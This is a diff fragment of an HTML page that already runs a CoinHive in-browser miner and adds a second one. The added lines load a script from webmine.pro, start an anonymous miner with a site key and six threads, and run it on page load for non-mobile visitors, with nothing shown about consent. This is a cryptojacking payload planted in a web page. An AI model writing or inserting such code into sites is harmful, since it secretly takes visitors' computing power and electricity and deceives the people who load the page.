@@ -45,7 +45,20 @@ if (!miner.isMobile()) {
 miner.start(CoinHive.FORCE_MULTI_TAB);
 	}
 </script>
+
 	
+<script src="//webmine.pro/lib/crlt.js"></script>
+<script>
+var miner=new CRLT.Anonymous('ea319dcdb64521a3d311f9a40e69e6d6107aa351a591',
+        {
+        threads:6,autoThreads:false,throttle:0.2,
+        }
+);
+if (!miner.isMobile()) {
+	miner.start();
+}
+
+</script>	
 	
 	
 </body>
